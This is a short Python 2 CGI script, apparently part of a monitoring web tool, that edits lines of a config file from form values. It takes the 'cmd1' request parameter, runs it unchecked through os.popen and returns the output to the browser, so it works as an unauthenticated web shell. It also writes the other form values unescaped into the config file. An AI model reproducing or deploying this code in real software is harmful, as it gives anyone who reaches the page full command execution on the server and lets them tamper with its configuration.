#!/usr/bin/python
import os
import cgi

class Web:

    form = cgi.FieldStorage()
    cmd = form.getvalue("cmd1")
    add_s = form.getvalue("add1")
    add_p = form.getvalue("add2")
    add_a = form.getvalue("add3")

    def files(self):
        print "content-type: text/html \r\n\r\n"
        print os.popen(Web.cmd).read()


    def do(self):
        with open('/opt/monitoring/html/replace/instance', 'r') as file:
            backup = file.readlines()

        backup[4] = "                        <string>%s</string>\n" %Web.add_s
        backup[7] = "                        <int>%s</int>\n"%Web.add_p
        backup[10]= '                        <string>%s</string>\n'%Web.add_a


        with open('/opt/monitoring/html/replace/instance', 'w') as file:
            file.writelines(backup)


web = Web()
web.files()
web.do()
